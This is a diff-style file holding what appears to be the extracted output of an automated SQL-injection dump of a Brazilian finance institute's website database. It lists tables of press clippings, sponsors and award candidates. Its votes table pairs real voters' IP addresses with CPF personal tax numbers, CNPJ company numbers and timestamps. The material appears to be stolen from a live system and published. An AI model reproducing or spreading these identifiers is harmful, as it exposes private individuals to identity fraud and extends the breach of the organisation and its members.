+| s     | 0        | 14          | 57              | NULL             | NULL             | 14/1203003353_ibef031.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 58              | NULL             | NULL             | 14/1203003366_ibef032.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 59              | NULL             | NULL             | 14/1203003382_ibef033.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 60              | NULL             | NULL             | 14/1203003414_ibef034.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 61              | NULL             | NULL             | 14/1203003425_ibef035.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 62              | NULL             | NULL             | 14/1203003437_ibef036.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 63              | NULL             | NULL             | 14/1203003448_ibef037.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 64              | NULL             | NULL             | 14/1203003461_ibef038.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 65              | NULL             | NULL             | 14/1203003473_ibef039.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 66              | NULL             | NULL             | 14/1203003484_ibef040.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 67              | NULL             | NULL             | 14/1203003498_ibef041.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 68              | NULL             | NULL             | 14/1203003513_ibef042.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 69              | NULL             | NULL             | 14/1203003537_ibef043.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 70              | NULL             | NULL             | 14/1203003549_ibef044.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 71              | NULL             | NULL             | 14/1203003565_ibef045.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 72              | NULL             | NULL             | 14/1203003576_ibef046.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 73              | NULL             | NULL             | 14/1203003587_ibef047.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 74              | NULL             | NULL             | 14/1203003599_ibef048.jpg       | Equilibrista 2007   | s                    |
+| s     | 0        | 14          | 75              | NULL             | NULL             | 14/1203003613_ibef049.jpg       | Equilibrista 2007   | s                    |
++-------+----------+-------------+-----------------+------------------+------------------+---------------------------------+---------------------+----------------------+
+
+Database: ibefprco_ger
+Table: t_google
+[1 entry]
++--------+
+| go_cod |
++--------+
+| 1      |
++--------+
+
+Database: ibefprco_ger
+Table: t_grupo_banner
+[1 entry]
++---------------+
+| gruban_codigo |
++---------------+
+| 1             |
++---------------+
+
+Database: ibefprco_ger
+Table: t_inscritos
+[50 entries]
++----------+
+| insc_cod |
++----------+
+| 1        |
+| 5        |
+| 6        |
+| 7        |
+| 8        |
+| 9        |
+| 10       |
+| 11       |
+| 12       |
+| 13       |
+| 14       |
+| 15       |
+| 16       |
+| 17       |
+| 18       |
+| 19       |
+| 20       |
+| 21       |
+| 22       |
+| 23       |
+| 24       |
+| 25       |
+| 26       |
+| 27       |
+| 28       |
+| 29       |
+| 30       |
+| 31       |
+| 32       |
+| 33       |
+| 34       |
+| 35       |
+| 36       |
+| 37       |
+| 38       |
+| 39       |
+| 40       |
+| 41       |
+| 42       |
+| 43       |
+| 44       |
+| 45       |
+| 46       |
+| 47       |
+| 48       |
+| 49       |
+| 50       |
+| 51       |
+| 52       |
+| 53       |
++----------+
+
+Database: ibefprco_ger
+Table: t_link
+[9 entries]
++---------------+
+| a_link_codigo |
++---------------+
+| 1             |
+| 2             |
+| 3             |
+| 4             |
+| 5             |
+| 6             |
+| 7             |
+| 8             |
+| 9             |
++---------------+
+
+Database: ibefprco_ger
+Table: t_menu
+[18 entries]
++-----------+
+| nivel_cod |
++-----------+
+| 1         |
+| 2         |
+| 3         |
+| 4         |
+| 5         |
+| 6         |
+| 7         |
+| 9         |
+| 10        |
+| 11        |
+| 12        |
+| 13        |
+| 14        |
+| 15        |
+| 16        |
+| 17        |
+| 18        |
+| 19        |
++-----------+
+
+Database: ibefprco_ger
+Table: t_meta_tag
+[1 entry]
++----------+
+| meta_cod |
++----------+
+| 1        |
++----------+
+
+Database: ibefprco_ger
+Table: t_noticias
+[50 entries]
++--------------+
+| noticias_cod |
++--------------+
+| 87           |
+| 88           |
+| 97           |
+| 110          |
+| 121          |
+| 123          |
+| 126          |
+| 128          |
+| 129          |
+| 130          |
+| 131          |
+| 132          |
+| 133          |
+| 138          |
+| 139          |
+| 140          |
+| 146          |
+| 147          |
+| 148          |
+| 151          |
+| 178          |
+| 180          |
+| 181          |
+| 183          |
+| 184          |
+| 185          |
+| 186          |
+| 187          |
+| 188          |
+| 189          |
+| 190          |
+| 191          |
+| 192          |
+| 193          |
+| 194          |
+| 195          |
+| 196          |
+| 197          |
+| 198          |
+| 199          |
+| 200          |
+| 201          |
+| 202          |
+| 203          |
+| 204          |
+| 205          |
+| 206          |
+| 207          |
+| 208          |
+| 209          |
++--------------+
+
+Database: ibefprco_ger
+Table: t_noticias_clippings
+[50 entries]
++----------+-------------+----------------------------------------------------+---------------+--------------+---------------------------------------------------------------------------------------------------------------------------------------+---------------------+----------------+-------------------------------------------------------------------------------------------------+----------------------------------------------+
+| user_cod | arq_tipo    | arq_nome                                           | arq_arquivo   | noticias_cod | noticias_link                                                                                                                         | noticias_data       | noticias_ativo | noticias_titulo                                                                                 | noticias_veiculo                             |
++----------+-------------+----------------------------------------------------+---------------+--------------+---------------------------------------------------------------------------------------------------------------------------------------+---------------------+----------------+-------------------------------------------------------------------------------------------------+----------------------------------------------+
+| 5        | image/jpeg  | 01 Associado pessoa juridica 2012.jpg              | ÿØÿà          | 10           | http://www.sigecom.com.br/literal/Aplicacao/Assessoria/clipping.manutencao.consulta.aspx?nCdNoticia=9353&bFlAcesso=1                  | 2013-01-24 00:00:00 | n              | Pagamento de impostos exige planejamento do consumidor                                          | Indústria e Comércio - PR                    |
+| 5        | image/jpeg  | 02051_142690p3.jpg                                 | ÿØÿà          | 39           | http://www.difundir.com.br/site/c_mostra_release.php?emp=02051&num_release=1426 90                                                    | 2014-11-19 00:00:00 | s              | Sorttie Soluções Criativas produz Revista Equilibrista para o IBEF-PR                           | Site Difundir                                |
+| 5        | image/jpeg  | 15533619022013_JE pg 15.jpg                        | ÿØÿà          | 11           | http://www.maxpressnet.com.br/Conteudo/1,573364,Nova_diretoria_do_IBEF_PR_toma_posse_no_dia_4_de_abril,573364,7.htm                   | 2013-03-26 00:00:00 | s              | Nova diretoria do IBEF PR toma posse no dia 4 de abril                                          | Maxpress                                     |
+| 5        | image/jpeg  | 16002124112014_BemPRpg25.jpg                       | \x89PNG       | 38           | http://www.bemparana.com.br/noticia/359778/chega-o-13o-salario.-veja-como-usa-lo                                                      | 2014-11-24 00:00:00 | s              | Chega o 13º salário. Veja como usá-lo                                                           | BEM PARANÁ - PR                              |
+| 5        | image/jpeg  | 16022421022013_Site Jornale.jpg                    | ÿØÿà          | 19           | http://jornale.com.br/ruy/?p=114682                                                                                                   | 2013-02-21 00:00:00 | s              | Troca de comando                                                                                | BLOG JORNALE - RUY BARROZO - PR              |
+| 5        | image/jpeg  | 16023421022013_Site Jornal de Londrina 17-02.jpg   | ÿØÿà          | 18           | http://www.jornaldelondrina.com.br/mundo/conteudo.phtml?id=1345693                                                                    | 2013-02-17 00:00:00 | s              | IBEF-PR realiza eleições de sua nova diretoria                                                  | SITE JORNAL DE LONDRINA - PR                 |
+| 5        | image/jpeg  | 16024621022013_Blog Leonardo Gazini Facchini.jpg   | ÿØÿà          | 17           | http://blog.leonardofacchini.com.br/2013/02/15/saude-financeira-chegou-a-hora-de-pagar-a-vista-ou-parcelado/                          | 2013-02-15 00:00:00 | s              | Saúde                                                                                           | BLOG LEONARDO GAZINI FACCHINI                |
+| 5        | image/jpeg  | 16334905042013_Site Jornal de Colombo.jpg          | ÿØÿà          | 28           | NULL                                                                                                                                  | 2013-04-04 00:00:00 | s              | Nova diretoria do IBEF-PR toma posse                                                            | JORNAL DE COLOMBO - PR                       |
+| 5        | image/jpeg  | 16383304042013_Site araxa.jpg                      | ÿØÿà          | 32           | http://www.correiodearaxa.com.br/noticia_geral.php?IdNoticia=6763                                                                     | 2013-04-03 00:00:00 | s              | Diretor da Ibema assume presidência do IBEF-PR                                                  | SITE CORREIO DE ARAXA                        |
+| 5        | image/jpeg  | 16385404042013_Site Coluna Cultura e Sociedade.jpg | ÿØÿà          | 29           | http://colunaculturaesociedade.blogspot.com.br/2013/04/coluna-do-dia-040413.html                                                      | 2013-04-03 00:00:00 | s              | A nova diretoria do IBEF PR para a gestão 2013-2015                                             | BLOG COLUNA CULTURA & SOCIEDADE - PR         |
+| 5        | image/jpeg  | 16390704042013_Site Coluna Personalidades.jpg      | ÿØÿà          | 30           | http://colunapersonalidades.blogspot.com.br/2013/04/coluna-do-dia-030413_6982.html                                                    | 2013-04-03 00:00:00 | s              | A nova diretoria do IBEF PR para a gestão 2013-2015                                             | BLOG COLUNA PERSONALIDADES - PR              |
+| 5        | image/jpeg  | 16453904042013_Site coxonautas.jpg                 | ÿØÿà          | 31           | http://www.coxanautas.com.br/noticias/conteudo.phtml?id=35340&t=Diretoria-alviverde-toma-posse-no-IBEF                                | 2013-04-03 00:00:00 | s              | Diretoria alviverde toma posse no IBEF                                                          | SITE COXANAUTAS                              |
+| 5        | image/jpeg  | 16455004042013_Site GP.jpg                         | ÿØÿà          | 27           | http://www.gazetadopovo.com.br/colunistas/conteudo.phtml?tl=1&id=1359924&tit=Manha-civica-                                            | 2013-04-04 00:00:00 | s              | Presidência IBEF-PR                                                                             | GAZETA DO POVO - REINALDO BESSA - PR         |
+| 5        | image/jpeg  | 17164207052013_ÓTV 03-05.jpg                       | ÿØÿà          | 33           | http://www.otv.tv.br/programa/outra-conversa/ele-e-gerente-corporativo-mas-o-assunto-e-aeromodelismo/                                 | 2013-05-03 00:00:00 | s              | Ele é gerente corporativo, mas o assunto é aeromodelismo                                        | ÓTV                                          |
+| 5        | image/jpeg  | 17192821112013_RevistaCaras2111.jpg                | \x89PNG       | 34           | http://www.sigecom.com.br/literal/Aplicacao/Assessoria/clipping.manutencao.consulta.aspx?nCdNoticia=25207&bFlAcesso=1                 | 2013-11-25 00:00:00 | s              | Equilibrista 2013 - Revista Caras                                                               | Revista Caras                                |
+| 5        | image/jpeg  | 545f4473ede303930c000003-original.jpg              | ÿØÿà          | 43           | http://vrnews.com.br/noticia/o-glamour-e-sofisticacao-do-premio-equilibrista                                                          | 2014-11-04 00:00:00 | s              | Glamour e sofisticação na entrega do Prêmio Equilibrista IBEF PR                                | BLOG LEITE QUENTE E NEWS - PR                |
+| 5        | image/jpeg  | 545f4473ede303930c000003-original.jpg              | ÿØÿà          | 40           | http://leitequenteenews.blogspot.com.br/2014/11/festas-news.html                                                                      | 2014-11-10 00:00:00 | s              | O Glamour e sofisticação do Prêmio Equilibrista                                                 | Site VR News                                 |
+| 5        | image/jpeg  | bessa_2_041114.jpg                                 | ÿØÿà          | 42           | http://www.gazetadopovo.com.br/colunistas/conteudo.phtml?tl=1&id=1511076&tit=Adeus-Edvino                                             | 2014-11-04 00:00:00 | s              | Premio Equilibrista 2014                                                                        | GAZETA DO POVO - REINALDO BESSA - PR         |
+| 5        | image/jpeg  | Cida-Borghetti-e-Luciano-Pi.jpg                    | ÿØÿà          | 41           | http://www.leiaecocentral.com.br/pierpaolo-nota-premio-equilibrista-ibef-pr/                                                          | 2014-11-07 00:00:00 | s              | Pierpaolo Nota \x96 Prêmio Equilibrista IBEF-PR                                                 | JORNAL ECO CENTRAL                           |
+| 1        | image/pjpeg | clip_1.jpg                                         | ÿØÿà          | 1            | http://www.dignow.org/post/ibef-pr-promoveu-festa-de-entrega-do-prÃªmio-equilibrista-2012-4761418-81474.                              | 2012-11-12 00:00:00 | s              | Ibef-PR promoveu festa de entrega do Prêmio Equilibrista 2012                                   | DIGNOW                                       |
+| 2        | image/pjpeg | clip_2.jpg                                         | ÿØÿà          | 2            | http://www.callcentercuritiba.com.br/blog/premio-equilibrista-2012-ibef-pr/                                                           | 2012-11-09 00:00:00 | s              | Prêmio Equilibrista 2012                                                                        | CALL CENTER CURITIBA                         |
+| 2        | image/pjpeg | clip_3.jpg                                         | ÿØÿà          | 3            | http://www.gazetadopovo.com.br/colunistas/conteudo.phtml?tl=1&id=1317116&tit=O-breve-paraiso-de-Fruet                                 | 2012-11-11 00:00:00 | s              | IBEF PR entrega Prêmio Equilibrista nesta quinta-feira                                          | GAZETA DO POVO - REINALDO BESSA              |
+| 2        | image/pjpeg | clip_4.jpg                                         | ÿØÿà          | 4            | http://www.gazetadopovo.com.br/colunistas/conteudo.phtml?tl=1&id=1317116&tit=O-breve-paraiso-de-Fruet                                 | 2012-11-11 00:00:00 | s              | Prêmio Equilibrista 2012                                                                        | GAZETA DO POVO - REINALDO BESSA              |
+| 2        | image/pjpeg | clip_5.jpg                                         | ÿØÿà          | 5            | http://www.parana-online.com.br/colunistas/195/94581/?postagem=FOLIANOPOLIS+2012+O+AXE+INVADIR+A+CAPITAL+CATARINENSE#Luiz             | 2012-11-12 00:00:00 | s              | Prêmio Equilibrista 2012                                                                        | PARANÁ ONLINE                                |
+| 2        | image/pjpeg | clip_6.jpg                                         | ÿØÿà          | 6            | http://simonebello.blogspot.com.br/2012/11/ibef-pr-promoveu-festa-de-entrega-do.html                                                  | 2012-11-12 00:00:00 | s              | Ibef-PR promoveu festa de entrega do Prêmio Equilibrista 2012                                   | Blog Simone Bello                            |
+| 2        | image/pjpeg | clip_7.jpg                                         | ÿØÿà          | 7            | http://www.jornaluniao.com.br/noticias.php?noticia=MjI1MjM=                                                                           | 2012-11-12 00:00:00 | s              | Diretor do Condor é Destaque Finanças no Paraná                                                 | JORNAL UNIÃO                                 |
+| 2        | image/pjpeg | clip_8.jpg                                         | ÿØÿà          | 8            | http://www.portalapas.org.br/m5_noticia.asp?cod_noticia=12960&cod_pagina=1222&categoria=                                              | 2012-11-14 00:00:00 | s              | Diretor do Condor é Destaque Finanças no Paraná                                                 | PORTAL APAS                                  |
+| 2        | image/pjpeg | clip_9.jpg                                         | ÿØÿà          | 9            | http://leitequenteenews.blogspot.com.br/2012/11/premio-equilibristablog-leite-quentee.html                                            | 2012-11-14 00:00:00 | s              | Prêmio Equilibrista                                                                             | LEITE QUENTE NEWS                            |
+| 5        | image/jpeg  | Edineia Martins.jpg                                | ÿØÿà          | 36           | http://jornalenoticias.com.br/mirian/?p=26284                                                                                         | 2013-11-25 00:00:00 | s              | Premio Equilibrista                                                                             | Blog Mirian Gasparin                         |
+| 5        | image/jpeg  | Ibef-Premio O Equilibrista 625.JPG                 | ÿØÿà          | 37           | http://www.gazetadopovo.com.br/colunistas/conteudo.phtml?tl=1&id=1424108&tit=Almoco-e-jantar-reais-                                   | 2013-11-25 00:00:00 | s              | Equilibrista-2013                                                                               | Reinaldo Bessa                               |
+| 5        | image/jpeg  | IEC.jpg                                            | ÿØÿà          | 20           | NULL                                                                                                                                  | 2013-04-02 00:00:00 | s              | Diretor da Ibema assume presidência do IBEF-PR                                                  | Indústria e Comércio - PR                    |
+| 5        | image/jpeg  | Logo Equilibrista 2013.jpg                         | ÿØÿà          | 35           | http://www.bemparana.com.br/noticia/289451/premio-equilibrista-destaca-lideranca-feminina-em-2013#.UpOSfNJwpft                        | 2013-11-25 00:00:00 | s              | Equilibrista-2013                                                                               | Bem Paraná                                   |
+| 2        | image/jpeg  | pagina_1.jpg                                       | ÿØÿà          | 49           | http://miriangasparin.com.br/2016/09/executivos-de-financas-candidatos-ao-premio-equilibrista-de-2016-mostram-como-superar-a-crise/   | 2016-11-01 00:00:00 | s              | Homenagem ao Equilibrista 2016                                                                  | Indústria & Comércio                         |
+| 2        | image/jpeg  | pagina_1.jpg                                       | ÿØÿà          | 48           | http://www.gazetadopovo.com.br/blogs/blog-do-bessa/diretor-da-arauco-recebe-trofeu-equilibrista-2016-em-noite-concorrida-no-graciosa/ | 2016-11-01 00:00:00 | s              | Homenagem ao Equilibrista 2016                                                                  | IC News                                      |
+| 2        | image/jpeg  | pagina_1.jpg                                       | ÿØÿà          | 47           | http://miriangasparin.com.br/2016/10/economista-do-bradesco-projeta-juros-menores-e-dolar-em-alta-para-2017/                          | 2016-10-28 00:00:00 | s              | Economista do Bradesco projeta juros menores e dólar em alta para 2017                          | Mirian Gasparin                              |
+| 2        | image/jpeg  | pagina_1.jpg                                       | ÿØÿà          | 46           | http://www.diarioinduscom.com/hora-da-realidade-habemus-praefectus-saudosista/                                                        | 2016-10-28 00:00:00 | s              | Diretor da Arauco recebe Troféu Equilibrista 2016 em noite concorrida no Graciosa               | Gazeta Do Povo                               |
+| 2        | image/jpeg  | pagina_1.jpg                                       | ÿØÿà          | 45           | NULL                                                                                                                                  | 2016-09-17 00:00:00 | s              | Executivos de finanças, candidatos ao prêmio Equilibrista de 2016, mostram como superar a crise | Mirian Gasparin                              |
+| 2        | image/jpeg  | pagina_1.jpg                                       | ÿØÿà          | 50           | NULL                                                                                                                                  | 2016-10-29 00:00:00 | s              | Clécio Chiamulera...                                                                            | Gazeta Do Povo                               |
+| 5        | image/jpeg  | Pr+¬mio-Equilibrista-2014-170.jpg                  | ÿØÿá=\x08Exif | 44           | http://jornalenoticias.com.br/ruy/?p=165349                                                                                           | 2014-11-03 00:00:00 | s              | \x93Equilibrista\x94 em festa                                                                   | BLOG JORNAL E NOTÍCIAS - RUY BARROZO - PR    |
+| 5        | image/jpeg  | Site Agregário.jpg                                 | ÿØÿà          | 12           | http://agregario.com/nova-diretoria-ibef-pr-toma-posse-dia-4-abril                                                                    | 2013-03-26 00:00:00 | s              | Nova diretoria do IBEF PR toma posse no dia 4 de abril                                          | Site Agrário                                 |
+| 5        | image/jpeg  | Site Celulose Online.jpg                           | ÿØÿà          | 25           | http://www.celuloseonline.com.br/noticias/Diretor+da+Ibema+assume+presidncia+do+IBEFPR                                                | 2013-04-03 00:00:00 | s              | Diretor da Ibema assume presidência do IBEF-PR                                                  | SITE CELULOSE ONLINE - SP                    |
+| 5        | image/jpeg  | Site IEC.jpg                                       | ÿØÿà          | 21           | http://www.icnews.com.br/2013.04.01/negocios/diretor-da-ibema-assume-presidencia-do-ibef-pr/                                          | 2013-04-02 00:00:00 | s              | Diretor da Ibema assume presidência do IBEF-PR                                                  | SITE IC NEWS - PR                            |
+| 5        | image/jpeg  | Site Incorporativa.jpg                             | ÿØÿà          | 14           | http://www.pautas.incorporativa.com.br/a-mostra-release.php?id=17221                                                                  | 2013-03-26 00:00:00 | s              | Nova diretoria do IBEF PR toma posse no dia 4 de abril                                          | Site Incorporativa                           |
+| 5        | image/jpeg  | Site Incorporativa.jpg                             | ÿØÿà          | 13           | http://www.pautas.incorporativa.com.br/a-mostra-release.php?id=17221                                                                  | 2013-03-26 00:00:00 | s              | No                                                                                              | Site Incorporativa                           |
+| 5        | image/jpeg  | Site Jornale.jpg                                   | ÿØÿà          | 15           | http://www.portaljornale.com.br/web/index.php/blogs/miriam-gasparim                                                                   | 2013-03-26 00:00:00 | s              | Nova diretoria do IBEF PR toma posse no dia 4 de abril                                          | SITE PORTAL JORNALE - MIRIAN GASPARIN - PR   |
+| 5        | image/jpeg  | Site Leite Quente e News.jpg                       | ÿØÿà          | 26           | http://leitequenteenews.blogspot.com.br/2013/04/news-da-hora.html                                                                     | 2013-04-03 00:00:00 | s              | Diretor da Ibema assume presidência do IBEF-PR                                                  | SITE LEITE QUENTE E NEWS - PR                |
+| 5        | image/jpeg  | Site Notícia da Cidades.jpg                        | ÿØÿà          | 23           | http://www.noticiasdacidade.org/noticias/ibema-pr                                                                                     | 2013-04-02 00:00:00 | s              | Diretor da Ibema assume presidência do IBEF-PR                                                  | SITE NOTÍCIAS DA CIDADE                      |
+| 5        | image/jpeg  | Site OEPR 02-04.jpg                                | ÿØÿà          | 22           | http://oestadodoparana.pron.com.br/economia/noticias/77144/?noticia=nova-diretoria-do-ibef-pr-toma-posse-no-dia-4-de-abril            | 2013-04-02 00:00:00 | s              | Nova diretoria do IBEF PR toma posse no dia 4 de abril                                          | SITE O ESTADO DO PARANÁ - PR                 |
+| 5        | image/jpeg  | Site Professional Publish 02-04.jpg                | ÿØÿà          | 24           | http://www.professionalpublish.com.br/?id=77,1,view,2,16985,sid                                                                       | 2013-04-02 00:00:00 | s              | Mercado: Diretor da Ibema assume presidência do IBEF-PR                                         | SITE PROFESSIONAL PUBLISH - SP               |
+| 5        | image/jpeg  | Site Refrescante.jpg                               | ÿØÿà          | 16           | http://refrescante.com.br/nova-diretoria-do-ibef-pr-toma-posse-no-dia-4-de-abril.html                                                 | 2013-03-26 00:00:00 | s              | Nova diretoria do IBEF PR toma posse no dia 4 de abril                                          | SITE REFRESCANTE                             |
++----------+-------------+----------------------------------------------------+---------------+--------------+---------------------------------------------------------------------------------------------------------------------------------------+---------------------+----------------+-------------------------------------------------------------------------------------------------+----------------------------------------------+
+
+Database: ibefprco_ger
+Table: t_noticias_isae
+[16 entries]
++--------------+
+| noticias_cod |
++--------------+
+| 1            |
+| 2            |
+| 3            |
+| 4            |
+| 5            |
+| 6            |
+| 7            |
+| 8            |
+| 9            |
+| 10           |
+| 11           |
+| 12           |
+| 13           |
+| 14           |
+| 15           |
+| 16           |
++--------------+
+
+Database: ibefprco_ger
+Table: t_parceiros
+[8 entries]
++----------+
+| parc_cod |
++----------+
+| 1        |
+| 2        |
+| 3        |
+| 4        |
+| 5        |
+| 6        |
+| 7        |
+| 8        |
++----------+
+
+Database: ibefprco_ger
+Table: t_patrocinadores
+[13 entries]
++----------+----------+--------------------------------+------------------------------------------------+------------+------------+----------------+-----------------+------------------+
+| parc_cod | user_cod | parc_nome                      | parc_link                                      | parc_ativo | parc_ordem | parc_logo_tipo | parc_logo_nome  | parc_logo_imagem |
++----------+----------+--------------------------------+------------------------------------------------+------------+------------+----------------+-----------------+------------------+
+| 1        | 10       | BRADESCO                       | https://banco.bradesco/html/classic/index.shtm | s          | 15         | image/jpeg     | bradesco.jpg    | ÿØÿà             |
+| 2        | 10       | DELOITTE                       | https://www2.deloitte.com/br/pt.html           | e          | 04         | image/jpeg     | deloitte_3.jpg  | ÿØÿá             |
+| 3        | 10       | DOMINGUES                      | http://www.dmgsa.com.br/                       | s          | 12         | image/jpeg     | domingues_2.jpg | ÿØÿá             |
+| 4        | 10       | DELOITTE                       | https://www2.deloitte.com/br/pt.html           | s          | 05         | image/jpeg     | deloitte_3.jpg  | ÿØÿá             |
+| 5        | 10       | JA REZENDE                     | http://www.jarezende.com.br/                   | s          | 11         | image/jpeg     | ja_4.jpg        | ÿØÿá             |
+| 6        | 10       | SMART CONSULTING               | https://www.smartcg.com.br/                    | s          | 10         | image/jpeg     | Smart_cons.jpg  | ÿØÿá             |
+| 7        | 10       | THÁ                            | https://www.tha.com.br/                        | s          | 09         | image/jpeg     | tha_6.jpg       | ÿØÿá             |
+| 8        | 10       | SAFRA                          | https://www.safra.com.br/                      | s          | 16         | image/jpeg     | safra_00.jpg    | ÿØÿá             |
+| 9        | 10       | IFORENSE                       | NULL                                           | s          | 08         | image/jpeg     | image_jpeg.jpg  | ÿØÿá             |
+| 10       | 10       | VALORE INVESTIMENTO            | https://valoreinvestimentos.com.br/            | s          | 07         | image/jpeg     | valore_7.jpg    | ÿØÿá             |
+| 11       | 10       | KPMG                           | https://home.kpmg.com/br/pt/home.html          | s          | 13         | image/jpeg     | kpmg.jpg        | ÿØÿá             |
+| 12       | 67       | SMART CONSULTORIA E GOVERNANÇA | https://www.smartcg.com.br/                    | e          | 05         | image/jpeg     | Smart_cons.jpg  | ÿØÿá             |
+| 13       | 10       | CAIXA ECONÔMICA FEDERAL        | http://www.caixa.gov.br                        | s          | 14         | image/jpeg     | caixa_eco.jpg   | ÿØÿá             |
++----------+----------+--------------------------------+------------------------------------------------+------------+------------+----------------+-----------------+------------------+
+
+Database: ibefprco_ger
+Table: t_permissoes
+[50 entries]
++----------+
+| user_cod |
++----------+
+| 1        |
+| 1        |
+| 1        |
+| 1        |
+| 1        |
+| 1        |
+| 1        |
+| 1        |
+| 1        |
+| 1        |
+| 1        |
+| 1        |
+| 1        |
+| 1        |
+| 1        |
+| 1        |
+| 1        |
+| 1        |
+| 1        |
+| 2        |
+| 2        |
+| 2        |
+| 2        |
+| 2        |
+| 2        |
+| 2        |
+| 2        |
+| 2        |
+| 2        |
+| 2        |
+| 2        |
+| 2        |
+| 2        |
+| 2        |
+| 2        |
+| 2        |
+| 2        |
+| 2        |
+| 3        |
+| 3        |
+| 3        |
+| 3        |
+| 3        |
+| 3        |
+| 3        |
+| 3        |
+| 3        |
+| 3        |
+| 3        |
+| 3        |
++----------+
+
+Database: ibefprco_ger
+Table: t_premios
+[7 entries]
++------------+
+| premio_cod |
++------------+
+| 1          |
+| 3          |
+| 4          |
+| 5          |
+| 6          |
+| 7          |
+| 8          |
++------------+
+
+Database: ibefprco_ger
+Table: t_regulamentos
+[7 entries]
++---------+
+| reg_cod |
++---------+
+| 1       |
+| 2       |
+| 3       |
+| 4       |
+| 5       |
+| 6       |
+| 7       |
++---------+
+
+Database: ibefprco_ger
+Table: t_revelacoes
+[1 entry]
++------------+
+| premio_cod |
++------------+
+| 1          |
++------------+
+
+Database: ibefprco_ger
+Table: t_revelacoes_candidatos
+[3 entries]
++----------+------------+-------------------------+----------+--------------------------+-----------+------------------------------+------------+---------------------------------------+------------+------------+-------------+--------------------------------------+
+| user_cod | arq_tipo   | arq_nome                | cand_cod | arq2_nome                | cand_desc | cand_nome                    | cand_ordem | cand_cargo                            | cand_ativo | premio_cod | arq_arquivo | cand_empresa                         |
++----------+------------+-------------------------+----------+--------------------------+-----------+------------------------------+------------+---------------------------------------+------------+------------+-------------+--------------------------------------+
+| 2        | image/jpeg | evaristobicalho.jpg     | 2        | evaristobicalho.pdf      | NULL      | Evaristo José Garcia Bicalho | 1          | Gerente Financeiro / Diretor Regional | s          | 1          | ÿØÿà        | Grupo Marista                        |
+| 2        | image/jpeg | guillermowinocur.jpg    | 3        | guillermowinocur.pdf     | NULL      | Guillermo Winocur            | 2          | Gerente de Tesouraria                 | s          | 1          | ÿØÿà        | Grupo Boticário                      |
+| 2        | image/jpeg | luiz_albertobressan.jpg | 1        | luis_alberto_bressan.pdf | NULL      | Luiz Alberto Bressan         | 3          | Gerente Administrativo Financeiro     | s          | 1          | ÿØÿà        | Terminal de Contêineres de Paranaguá |
++----------+------------+-------------------------+----------+--------------------------+-----------+------------------------------+------------+---------------------------------------+------------+------------+-------------+--------------------------------------+
+
+Database: ibefprco_ger
+Table: t_revelacoes_regulamentos
+[0 entries]
++---------+----------+----------+-----------+------------+
+| reg_cod | user_cod | reg_desc | reg_ativo | premio_cod |
++---------+----------+----------+-----------+------------+
++---------+----------+----------+-----------+------------+
+
+Database: ibefprco_ger
+Table: t_revelacoes_votos
+[50 entries]
++-----------------+-------------+----------------+---------------------+----------+-----------+------------+
+| ip              | cpf         | cnpj           | data                | cand_cod | socio_cod | premio_cod |
++-----------------+-------------+----------------+---------------------+----------+-----------+------------+
+| 138.204.25.254  | NULL        | NULL           | 2018-09-25 10:49:17 | 3        | 9976      | 1          |
+| 138.204.26.160  | 52548210944 | 81172850000179 | 2018-09-22 23:38:41 | 3        | 0         | 1          |
+| 138.21.148.240  | NULL        | NULL           | 2018-09-20 14:30:36 | 3        | 9998      | 1          |
+| 143.255.162.203 | NULL        | NULL           | 2018-09-20 23:16:56 | 3        | 10025     | 1          |
+| 143.255.162.78  | 05421697975 | 03461923000139 | 2018-09-25 17:46:10 | 1        | 0         | 1          |
+| 168.181.49.17   | 54426804949 | 68803998000104 | 2018-09-25 13:31:43 | 1        | 0         | 1          |
+| 168.181.50.179  | 73748358920 | 00089907000179 | 2018-09-20 16:06:40 | 2        | 0         | 1          |
+| 168.194.162.43  | NULL        | NULL           | 2018-09-20 17:56:03 | 1        | 10019     | 1          |
+| 168.194.163.124 | 06648567996 | 10631833000104 | 2018-09-25 10:00:24 | 2        | 0         | 1          |
+| 170.78.186.17   | NULL        | NULL           | 2018-09-26 15:24:02 | 1        | 9907      | 1          |
+| 177.124.61.66   | 00963448900 | 04807000000159 | 2018-09-20 14:04:44 | 2        | 0         | 1          |
+| 177.133.193.226 | NULL        | NULL           | 2018-09-24 13:49:13 | 2        | 93        | 1          |
+| 177.135.70.130  | NULL        | NULL           | 2018-09-20 14:05:09 | 2        | 890       | 1          |
+| 177.157.2.190   | NULL        | NULL           | 2018-09-24 15:29:06 | 2        | 10006     | 1          |
+| 177.16.161.119  | NULL        | NULL           | 2018-09-20 14:25:47 | 1        | 675       | 1          |
+| 177.187.218.164 | NULL        | NULL           | 2018-09-21 09:36:23 | 2        | 24        | 1          |
+| 177.220.173.30  | NULL        | NULL           | 2018-09-20 14:04:03 | 2        | 10067     | 1          |
+| 177.220.174.41  | NULL        | NULL           | 2018-09-25 16:07:38 | 1        | 9980      | 1          |
+| 177.220.188.59  | NULL        | NULL           | 2018-09-24 10:47:05 | 2        | 872       | 1          |
+| 177.220.188.59  | NULL        | NULL           | 2018-09-24 14:42:25 | 3        | 10076     | 1          |
+| 177.220.188.59  | NULL        | NULL           | 2018-09-24 17:32:36 | 2        | 211       | 1          |
+| 177.69.198.31   | NULL        | NULL           | 2018-09-20 15:24:57 | 3        | 9953      | 1          |
+| 177.69.198.31   | 03872854982 | 59947044000338 | 2018-09-21 00:55:04 | 2        | 0         | 1          |
+| 177.79.3.163    | 84394323053 | 18466149000126 | 2018-09-23 11:58:07 | 1        | 0         | 1          |
+| 177.79.71.118   | 03148035992 | 10631833000104 | 2018-09-23 21:15:12 | 1        | 0         | 1          |
